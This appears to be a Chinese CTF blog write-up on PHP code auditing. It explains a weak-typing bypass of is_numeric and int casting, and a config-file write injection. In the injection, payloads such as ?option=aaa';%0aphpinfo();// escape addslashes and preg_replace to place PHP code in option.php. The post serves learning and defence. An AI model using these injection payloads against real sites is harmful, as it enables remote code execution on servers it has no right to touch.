---
title: PHP-Challenge-1
date: 2018-12-01 19:48:06
categories:
- Web安全
- CTF
tags:
- PHP代码审计
- 安全
- CTF
---

<!--more-->

# 0x01 弱类型

```php
<?php
show_source(__FILE__);
$flag = "xxxx";
if(isset($_GET['time'])){ 
        if(!is_numeric($_GET['time'])){ 
                echo 'The time must be number.'; 
        }else if($_GET['time'] < 60 * 60 * 24 * 30 * 2){ 	//5184000
                        echo 'This time is too short.'; 
        }else if($_GET['time'] > 60 * 60 * 24 * 30 * 3){ 	//7776000
                        echo 'This time is too long.'; 
        }else{ 
                sleep((int)$_GET['time']); 
                echo $flag; 
        } 
                echo '<hr>'; 
}
?>
```

程序逻辑大致如下： 

1. 通过**is_numeric**判断**time**是否为数字
2. 要求输入的**time**位于**5184000**和**7776000**之间
3. 将输入的**time**转换为**int**并传入**sleep()**函数

如果真的将传入的**time**设置为上述的区间，那么程序的**sleep()**函数将会让我们一直等。

这里运用到PHP弱类型的性质就可以解决，**is_numeric()**函数支持十六进制字符串和科学记数法型字符串，而**int**强制转换下，会出现错误解析。



> 5184000	  ->   0x4f1a00

因此第一种方法，我们可以传入**?time=0x4f1a01**

还有就是科学记数法类型的**?time=5.184001e6**，五秒钟还是可以等的。



# 0x02 配置文件写入问题

> index.php

```php
<?php
$str = addslashes($_GET['option']);
$file = file_get_contents('xxxxx/option.php');
$file = preg_replace('|\$option=\'.*\';|', "\$option='$str';", $file);
file_put_contents('xxxxx/option.php', $file);
```

> xxxxx/option.php

```php
<?php
$option='test';
?>
```

程序逻辑大致如下：

1. 将传入的**option**参数进行**addslashes()**字符串转义操作
2. 通过正则将**$file**中的**test**改为**$str**的值
3. 将修改后的值写入文件

这个问题是在p师傅的知识星球里面提出来的，CHY师傅整理出来的，这种情景通常出现在配置文件写入中。

### 方法一：换行符突破

> ```php
> ?option=aaa';%0aphpinfo();//
> ```

经过**addslashes()**处理过后，**$str = aaa\\';%0aphpinfo();//**

通过正则匹配过后写入文件，**option.php**的内容变为如下内容

```php
<?php 
$option='aaa\';
phpinfo();//';
?>
```

可以看出后一个单引号被转义，所以单引号并没有被闭合，那么**phpinfo**就不能执行，所以再进行一次写入。

> ?option=xxx

再次进行正则匹配时候，则会将引号里面的替换为**xxx**，此时**option.php**内容如下：

```php
<?php
$option='xxx';
phpinfo();//';
?>
```

这时候就可以执行**phpinfo**。



### 方法二：preg_replace()的转义

 ```php
 ?option=aaa\';phpinfo();//
 ```

**addslashes()**转换过后**$str = aaa\\\\\\';phpinfo();//**

经过**preg_replace()**匹配过后，会对**\\**进行转义处理，所以写入的信息如下：

```php
<?php
$option='aaa\\';phpinfo();//';
?>
```



# 总结

Reference：

> [http://www.cnblogs.com/iamstudy/articles/config_file_write_vue.html](http://www.cnblogs.com/iamstudy/articles/config_file_write_vue.html)
>
> P师傅知识星球

不断的学习